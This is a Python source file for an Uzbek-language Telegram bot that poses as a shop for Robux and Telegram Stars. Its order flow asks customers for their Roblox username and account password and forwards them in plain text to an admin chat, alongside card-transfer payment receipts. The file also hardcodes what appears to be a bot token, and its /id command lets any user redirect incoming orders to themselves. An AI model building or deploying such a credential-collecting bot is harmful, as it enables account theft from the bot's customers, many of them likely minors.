import asyncio
import logging
import os
import sys
from dotenv import load_dotenv

# Windows konsolida Unicode xatoliklarini oldini olish
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

from aiogram import Bot, Dispatcher, Router, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.client.default import DefaultBotProperties

# .env faylini yuklaymiz
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "8987724485:AAEPxu-e0MU-0Rj_x0kywJudd-Bsz4i6Ekg").strip()
ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "@flexyha").strip()

DYNAMIC_ADMIN_ID = None
IS_SCHOOL_MODE = False

def get_target_admin_id():
    global DYNAMIC_ADMIN_ID
    if ADMIN_ID and str(ADMIN_ID).isdigit():
        return int(ADMIN_ID)
    return DYNAMIC_ADMIN_ID

CARD_NUMBER = "5614681914932540"

WELCOME_TEXT = """✨ <b>Hush kelibsiz! Robux va Telegram Stars rasmiy do'koni!</b>

💳 <b>Karta raqam:</b> <code>5614681914932540</code>

💰 <b>ROBUX NARXLAR</b>

💰 40 ROBUX - 7.500 UZS
💰 80 ROBUX - 14.500 UZS
💰 500 ROBUX – 66.000 UZS
💰 1000 ROBUX – 133.000 UZS
💰 2000 ROBUX – 265.000 UZS
💰 5250 ROBUX – 650.000 UZS

⭐️ <b>Plus Store:</b>
💰 Plus – 66.000 UZS
💰 500 Plus – 120.000 UZS
💰 1000 Plus – 175.000 UZS
💰 2000 Plus – 290.000 UZS


⚡️ <b>ARZON   ISHONCHLI   TEZ</b>

MUROJAT UCHUN: ⭐️ <b>Telegram stars (yulduz) oberamiz☑️</b>

🧸💝 15 talik gift — 3ming so'm💰
🎁🌹 25 talik gift — 5ming so'm💰
💐🚀🍾 50 talik gift — 10ming so'm💰
🏆💎💍 100 talik gift — 20ming so'm💰"""

def get_welcome_text():
    prefix = ""
    if IS_SCHOOL_MODE:
        prefix = "🏫 <b>DIQQAT: Admin hozir maktabda/o'qishda!</b>\n<i>Buyurtmangiz qabul qilinadi, lekin dars tugashi bilan tashlab beriladi!</i>\n\n"
    return prefix + WELCOME_TEXT


class OrderState(StatesGroup):
    waiting_for_product = State()
    waiting_for_roblox_username = State()
    waiting_for_roblox_password = State()
    waiting_for_receipt = State()


def get_main_keyboard():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}" if ADMIN_USERNAME else "https://t.me"
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🛒 Buyurtma berish", callback_data="start_order"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="💳 Karta raqamini nusxalash", callback_data="copy_card"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="👨‍💻 Adminga bog'lanish",
                    url=admin_url,
                ),
            ],
        ]
    )
    return keyboard


def get_cancel_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="❌ Bekor qilish", callback_data="cancel_order"
                )
            ]
        ]
    )


class AdminState(StatesGroup):
    waiting_for_custom_message = State()


def get_admin_order_keyboard(user_id: int):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Tashladim (Tasdiqlash)", callback_data=f"approve_{user_id}"
                ),
                InlineKeyboardButton(
                    text="❌ Rad etish", callback_data=f"reject_{user_id}"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="🏫 O'qishdaman (Xabar yuborish)", callback_data=f"school_{user_id}"
                ),
                InlineKeyboardButton(
                    text="✉️ Mijozga xabar yozish", callback_data=f"reply_{user_id}"
                ),
            ]
        ]
    )



router = Router()


@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    global DYNAMIC_ADMIN_ID
    await state.clear()
    
    user_un = message.from_user.username.lower() if message.from_user and message.from_user.username else ""
    target_un = ADMIN_USERNAME.replace("@", "").lower()
    is_admin = False
    
    if (user_un and user_un == target_un) or (ADMIN_ID and str(message.from_user.id) == str(ADMIN_ID)):
        DYNAMIC_ADMIN_ID = message.from_user.id
        is_admin = True
        logging.info(f"✅ Admin ID avtomatik tanindi va o'rnatildi: {DYNAMIC_ADMIN_ID} (Username: @{user_un})")
    elif DYNAMIC_ADMIN_ID == message.from_user.id:
        is_admin = True
    elif DYNAMIC_ADMIN_ID is None and not ADMIN_ID:
        if user_un == target_un:
            DYNAMIC_ADMIN_ID = message.from_user.id
            is_admin = True
    
    logging.info(f"👤 Botga start bosildi: {message.from_user.full_name} (@{user_un}) - ID: {message.from_user.id}")
    await message.answer(
        text=get_welcome_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=get_main_keyboard(),
    )
    
    if is_admin:
        status_txt = "YOQILGAN 🟢" if IS_SCHOOL_MODE else "O'CHIRILGAN ⚪️"
        await message.answer(
            text=f"👑 <b>Admin boshqaruv paneli:</b>\n\n"
                 f"🏫 Maktab/O'qish rejimi: <b>{status_txt}</b>\n\n"
                 f"📌 <i>Maktab rejimini yoqish/o'chirish:</i> /maktab\n"
                 f"🆔 <i>Admin ID ni ko'rish:</i> /id",
            parse_mode=ParseMode.HTML,
        )


@router.message(Command("maktab"))
async def cmd_maktab(message: Message):
    global IS_SCHOOL_MODE, DYNAMIC_ADMIN_ID
    user_un = message.from_user.username.lower() if message.from_user and message.from_user.username else ""
    target_un = ADMIN_USERNAME.replace("@", "").lower()
    
    is_admin = (
        (user_un and user_un == target_un)
        or (ADMIN_ID and str(message.from_user.id) == str(ADMIN_ID))
        or DYNAMIC_ADMIN_ID == message.from_user.id
        or DYNAMIC_ADMIN_ID is None
    )
    
    if is_admin:
        DYNAMIC_ADMIN_ID = message.from_user.id
        IS_SCHOOL_MODE = not IS_SCHOOL_MODE
        if IS_SCHOOL_MODE:
            msg = (
                "🏫 <b>Maktab rejimi YOQILDI! 🟢</b>\n\n"
                "Endi botga kirgan barcha mijozlarga maktabda/darsda ekanligingiz va buyurtmalar darsdan so'ng tashlab berilishi ko'rsatiladi."
            )
        else:
            msg = (
                "🏫 <b>Maktab rejimi O'CHIRILDI! ⚪️</b>\n\n"
                "Bot odatiy ish rejimiga qaytdi."
            )
        await message.answer(msg, parse_mode=ParseMode.HTML)
    else:
        await message.answer("❌ Bu buyruq faqat bot admini uchun!")


@router.message(Command("id"))
async def cmd_id(message: Message):
    global DYNAMIC_ADMIN_ID
    DYNAMIC_ADMIN_ID = message.from_user.id
    logging.info(f"✅ Admin ID /id orqali o'rnatildi: {DYNAMIC_ADMIN_ID}")
    status_txt = "YOQILGAN 🟢" if IS_SCHOOL_MODE else "O'CHIRILGAN ⚪️"
    await message.answer(
        text=f"🆔 <b>Sizning Telegram ID ingiz:</b> <code>{message.from_user.id}</code>\n\n"
             f"✅ Botingiz ushbu ID ga moslandi! Endi barcha buyurtmalar va cheklar sizga keladi.\n\n"
             f"🏫 Maktab rejimi: <b>{status_txt}</b> (/maktab orqali o'zgartirish)",
        parse_mode=ParseMode.HTML,
    )


@router.callback_query(F.data == "copy_card")
async def cb_copy_card(callback: CallbackQuery):
    await callback.answer(text="Karta raqami nusxalandi!", show_alert=False)
    await callback.message.answer(
        text=f"💳 <b>Karta raqami:</b>\n<code>{CARD_NUMBER}</code>\n\n<i>Ustiga bosing - nusxalanadi!</i>",
        parse_mode=ParseMode.HTML,
    )


@router.callback_query(F.data == "start_order")
async def cb_start_order(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(OrderState.waiting_for_product)
    await callback.message.answer(
        text="🛒 <b>Qaysi tarif/mahsulotni sotib olmoqchisiz?</b>\n\n"
        "Masalan: <i>1000 ROBUX</i> yoki <i>50 talik gift</i> deb yozing:",
        parse_mode=ParseMode.HTML,
        reply_markup=get_cancel_keyboard(),
    )


@router.callback_query(F.data == "cancel_order")
async def cb_cancel_order(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.answer(text="Buyurtma bekor qilindi.")
    await callback.message.answer(
        text="❌ Buyurtma bekor qilindi.\n\n" + get_welcome_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=get_main_keyboard(),
    )


@router.message(OrderState.waiting_for_product)
async def process_product(message: Message, state: FSMContext):
    await state.update_data(product=message.text)
    await state.set_state(OrderState.waiting_for_roblox_username)
    await message.answer(
        text="🎮 <b>Roblox Login (Foydalanuvchi nomi yoki Nikneymini)</b> kiriting:",
        parse_mode=ParseMode.HTML,
        reply_markup=get_cancel_keyboard(),
    )


@router.message(OrderState.waiting_for_roblox_username)
async def process_username(message: Message, state: FSMContext):
    await state.update_data(username=message.text)
    await state.set_state(OrderState.waiting_for_roblox_password)
    await message.answer(
        text="🔑 <b>Roblox akkauntingiz Parolini</b> kiriting:",
        parse_mode=ParseMode.HTML,
        reply_markup=get_cancel_keyboard(),
    )


@router.message(OrderState.waiting_for_roblox_password)
async def process_password(message: Message, state: FSMContext):
    await state.update_data(password=message.text)
    await state.set_state(OrderState.waiting_for_receipt)
    await message.answer(
        text=f"💳 <b>To'lovni ushbu karta raqamiga o'tkazing:</b>\n<code>{CARD_NUMBER}</code>\n\n"
        "📸 To'lov qilganingizdan so'ng, <b>to'lov chekini (rasm, fayl yoki matn)</b> shu yerga yuboring:",
        parse_mode=ParseMode.HTML,
        reply_markup=get_cancel_keyboard(),
    )


@router.message(OrderState.waiting_for_receipt)
async def process_receipt(message: Message, state: FSMContext, bot: Bot):
    user_data = await state.get_data()
    product = user_data.get("product")
    roblox_username = user_data.get("username")
    roblox_password = user_data.get("password")
    user_id = message.from_user.id

    user_info = f"👤 <b>Mijoz:</b> {message.from_user.full_name}\n"
    if message.from_user.username:
        user_info += f"🔗 <b>Username:</b> @{message.from_user.username}\n"
    user_info += f"🆔 <b>ID:</b> <code>{user_id}</code>"

    order_text = (
        f"🚨 <b>YANGI BUYURTMA TUSHDI!</b>\n\n"
        f"{user_info}\n\n"
        f"📦 <b>Mahsulot:</b> {product}\n"
        f"🎮 <b>Roblox Login:</b> <code>{roblox_username}</code>\n"
        f"🔑 <b>Roblox Parol:</b> <code>{roblox_password}</code>\n"
    )

    admin_keyboard = get_admin_order_keyboard(user_id)

    # Adminga xabar va chekni yuborish
    try:
        admin_target = get_target_admin_id()
        if admin_target:
            if message.photo:
                await bot.send_photo(
                    chat_id=admin_target,
                    photo=message.photo[-1].file_id,
                    caption=order_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=admin_keyboard,
                )
            elif message.document:
                await bot.send_document(
                    chat_id=admin_target,
                    document=message.document.file_id,
                    caption=order_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=admin_keyboard,
                )
            else:
                order_text += f"\n📝 <b>To'lov ma'lumoti:</b> {message.text}"
                await bot.send_message(
                    chat_id=admin_target,
                    text=order_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=admin_keyboard,
                )
        else:
            logging.warning("ADMIN_ID belgilanmagan! Adminga xabar yuborish uchun @flexyha botga /start bosing!")
    except Exception as e:
        logging.error(f"Adminga buyurtma yuborishda xatolik: {e}")

    school_extra = ""
    if IS_SCHOOL_MODE:
        school_extra = "\n\n🏫 <b>Eslatma:</b> Admin hozir o'qishda/maktabda. Buyurtmangiz qabul qilindi va dars tugashi bilan tezda tashlab beriladi!"

    await state.clear()
    await message.answer(
        text="✅ <b>Buyurtmangiz va to'lov chekingiz adminga yuborildi!</b>\n\n"
        "Admin to'lovni tekshirib, Robux / Stars ni tez orada yetkazib beradi va sizga xabar yuboriladi." + school_extra,
        parse_mode=ParseMode.HTML,
        reply_markup=get_main_keyboard(),
    )


# Admin tugmalarini boshqarish (Approve / Reject)
@router.callback_query(F.data.startswith("approve_"))
async def cb_approve_order(callback: CallbackQuery, bot: Bot):
    user_id = int(callback.data.split("_")[1])
    await callback.answer("Buyurtma tasdiqlandi!")

    # Mijozga avtomatik xabar yuborish
    try:
        await bot.send_message(
            chat_id=user_id,
            text="🎉 <b>Xushxabar! Sizning buyurtmangiz muvaffaqiyatli bajarildi!</b>\n\n"
            "Robux / Stars hisobingizga o'tkazib berildi. Bizning xizmatimizdan foydalanganingiz uchun rahmat! 😊",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        logging.error(f"Mijozga tasdiqlash xabari yuborishda xatolik: {e}")

    # Admin xabarini yangilash
    new_text = (callback.message.caption or callback.message.text or "") + "\n\n✅ <b>[ADMIN TAROFIDAN BAJARILDI]</b>"
    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=new_text, parse_mode=ParseMode.HTML, reply_markup=None)
    else:
        await callback.message.edit_text(text=new_text, parse_mode=ParseMode.HTML, reply_markup=None)


@router.callback_query(F.data.startswith("reject_"))
async def cb_reject_order(callback: CallbackQuery, bot: Bot):
    user_id = int(callback.data.split("_")[1])
    await callback.answer("Buyurtma rad etildi.")

    # Mijozga rad etish xabarini yuborish
    try:
        await bot.send_message(
            chat_id=user_id,
            text="⚠️ <b>Sizning buyurtmangiz rad etildi.</b>\n\n"
            "To'lov cheki tasdiqlanmadi yoki kiritilgan ma'lumotlarda xatolik bor.\n"
            "Savollaringiz bo'lsa adminga murojaat qiling.",
            parse_mode=ParseMode.HTML,
        )
    except Exception as e:
        logging.error(f"Mijozga rad xabari yuborishda xatolik: {e}")

    # Admin xabarini yangilash
    new_text = (callback.message.caption or callback.message.text or "") + "\n\n❌ <b>[ADMIN TARAFIDAN RAD ETILDI]</b>"
    if callback.message.photo or callback.message.document:
        await callback.message.edit_caption(caption=new_text, parse_mode=ParseMode.HTML, reply_markup=None)
    else:
        await callback.message.edit_text(text=new_text, parse_mode=ParseMode.HTML, reply_markup=None)


@router.callback_query(F.data.startswith("school_"))
async def cb_school_order(callback: CallbackQuery, bot: Bot):
    user_id = int(callback.data.split("_")[1])
    await callback.answer("Mijozga 'O'qishdaman' xabari yuborildi!")

    try:
        await bot.send_message(
            chat_id=user_id,
            text="🏫 <b>Hurmatli mijoz!</b>\n\n"
            "Admin hozir o'qishda/darsda. Buyurtmangiz va to'lovingiz qabul qilindi! "
            "Dars tugashi bilan (tez orada) Robux / Stars tashlab beriladi! Sabringiz uchun rahmat. 😊",
            parse_mode=ParseMode.HTML,
        )
        await callback.message.reply("✅ Mijozga o'qishda ekanligingiz haqida xabar yuborildi!")
    except Exception as e:
        logging.error(f"Mijozga o'qishda xabari yuborishda xatolik: {e}")
        await callback.message.reply(f"❌ Xabar yuborishda xatolik: {e}")


@router.callback_query(F.data.startswith("reply_"))
async def cb_reply_order(callback: CallbackQuery, state: FSMContext):
    user_id = int(callback.data.split("_")[1])
    await state.update_data(reply_target_user_id=user_id)
    await state.set_state(AdminState.waiting_for_custom_message)
    await callback.answer()
    await callback.message.reply(
        "✉️ <b>Mijozga yubormoqchi bo'lgan xabaringizni matn ko'rinishida yozib yuboring:</b>",
        parse_mode=ParseMode.HTML,
    )


@router.message(AdminState.waiting_for_custom_message)
async def process_admin_reply_message(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    target_user_id = data.get("reply_target_user_id")

    if not target_user_id:
        await message.answer("❌ Xatolik: Mijoz ID si topilmadi.")
        await state.clear()
        return

    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=f"📩 <b>Admindan xabar:</b>\n\n{message.text}",
            parse_mode=ParseMode.HTML,
        )
        await message.answer(f"✅ <b>Xabaringiz mijozga yetkazildi!</b>", parse_mode=ParseMode.HTML)
    except Exception as e:
        await message.answer(f"❌ Mijozga xabar yuborishda xatolik: {e}")

    await state.clear()



async def handle_home(request):
    from aiohttp import web
    return web.Response(text="Bot runs 24/7!")

async def handle_health(request):
    from aiohttp import web
    return web.Response(text="OK")

async def start_web_server():
    try:
        from aiohttp import web
        app = web.Application()
        app.router.add_get("/", handle_home)
        app.router.add_get("/health", handle_health)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.getenv("PORT", 8080))
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()
        print(f"[+] Web server {port}-portda ishga tushdi (Render Free Web Service uchun)")
    except Exception as e:
        logging.error(f"Web serverni ishga tushirishda xatolik: {e}")



async def main():
    logging.basicConfig(level=logging.INFO)

    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("\n" + "="*50)
        print("❌ XATOLIK: .env faylida BOT_TOKEN kiritilmagan!")
        print("Iltimos, .env faylini ochib, BOT_TOKEN va ADMIN_ID ni kiriting.")
        print("="*50 + "\n")
        return

    # Render Free Web Service uchun fon rejimida portni tinglaymiz
    asyncio.create_task(start_web_server())

    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    print("[+] Telegram bot muvaffaqiyatli ishga tushdi!")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, drop_pending_updates=True)


if __name__ == "__main__":
    asyncio.run(main())

